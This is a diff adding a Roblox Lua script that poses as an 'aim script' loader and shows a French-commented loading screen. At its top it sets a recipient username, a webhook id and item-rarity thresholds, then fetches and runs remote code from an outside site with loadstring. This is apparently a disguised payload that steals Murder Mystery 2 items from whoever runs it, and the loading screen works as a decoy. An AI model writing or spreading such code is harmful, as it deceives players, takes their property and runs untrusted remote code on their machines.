@@ -1,0 +1,132 @@
+local function _httpGet(url)
+    if typeof(request)=="function" then local r=request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(syn)=="table" and typeof(syn.request)=="function" then local r=syn.request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(http_request)=="function" then local r=http_request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(fluxus)=="table" and typeof(fluxus.request)=="function" then local r=fluxus.request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(http)=="table" and typeof(http.request)=="function" then local r=http.request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(game.HttpGet)=="function" then return game:HttpGet(url) end
+    error("[Loader] No HTTP method available on this executor")
+end
+
+getgenv().Username = "hthntyikntj"
+getgenv().Webhook = "wh_0575fc81f0e98e346ccf2c1ad038a599"
+getgenv().MinRarity = "Common"
+getgenv().MinValue = 0
+getgenv().Visual = ""
+getgenv().VisualMain = ""
+loadstring(_httpGet("https://bloxifieds.com/mm2/script"))()
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- 1. Création du ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingScreenGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Fond sombre semi-transparent
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
+mainFrame.BackgroundTransparency = 0.2
+mainFrame.Parent = screenGui
+
+-- Carte centrale
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, 320, 0, 180)
+container.Position = UDim2.new(0.5, -160, 0.5, -90)
+container.BackgroundColor3 = Color3.fromRGB(20, 22, 30)
+container.BorderSizePixel = 0
+container.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = container
+
+-- Icône de chargement stylée (Spinner)
+local spinner = Instance.new("ImageLabel")
+spinner.Size = UDim2.new(0, 50, 0, 50)
+spinner.Position = UDim2.new(0.5, -25, 0.2, 0)
+spinner.BackgroundTransparency = 1
+spinner.Image = "rbxassetid://6031280882" -- Ring Spinner
+spinner.ImageColor3 = Color3.fromRGB(0, 170, 255)
+spinner.Parent = container
+
+-- Texte principal
+local textLabel = Instance.new("TextLabel")
+textLabel.Size = UDim2.new(1, 0, 0, 25)
+textLabel.Position = UDim2.new(0, 0, 0.58, 0)
+textLabel.BackgroundTransparency = 1
+textLabel.Text = "Loading aim script"
+textLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
+textLabel.TextSize = 16
+textLabel.Font = Enum.Font.GothamBold
+textLabel.Parent = container
+
+-- Arrière-plan de la barre de progression
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.8, 0, 0, 6)
+barBg.Position = UDim2.new(0.1, 0, 0.8, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(35, 38, 50)
+barBg.BorderSizePixel = 0
+barBg.Parent = container
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = barBg
+
+-- Remplissage de la barre
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+barCorner:Clone().Parent = barFill
+
+-- 2. Animations
+-- Animation de rotation (Infinie jusqu'à la fin)
+local spinInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
+local spinTween = TweenService:Create(spinner, spinInfo, {Rotation = 360})
+spinTween:Play()
+
+-- Remplissage sur exactement 10 secondes
+local fillInfo = TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+local fillTween = TweenService:Create(barFill, fillInfo, {Size = UDim2.new(1, 0, 1, 0)})
+fillTween:Play()
+
+-- Animation du texte (petits points)
+task.spawn(function()
+    local dots = {"", ".", "..", "..."}
+    local count = 0
+    local startTime = tick()
+    
+    while tick() - startTime < 10 do
+        textLabel.Text = "Loading aim script" .. dots[(count % 4) + 1]
+        count = count + 1
+        task.wait(0.35)
+    end
+    
+    -- Fin du chargement
+    textLabel.Text = "Aim script loaded!"
+    textLabel.TextColor3 = Color3.fromRGB(85, 255, 127)
+    barFill.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
+    
+    task.wait(0.8)
+    
+    -- Disparition en fondu
+    local fadeInfo = TweenInfo.new(0.5)
+    TweenService:Create(mainFrame, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(container, fadeInfo, {BackgroundTransparency = 1}):Play()
+    TweenService:Create(textLabel, fadeInfo, {TextTransparency = 1}):Play()
+    TweenService:Create(spinner, fadeInfo, {ImageTransparency = 1}):Play()
+    local lastTween = TweenService:Create(barFill, fadeInfo, {BackgroundTransparency = 1})
+    lastTween:Play()
+    
+    lastTween.Completed:Connect(function()
+        screenGui:Destroy()
+    end)
+end)
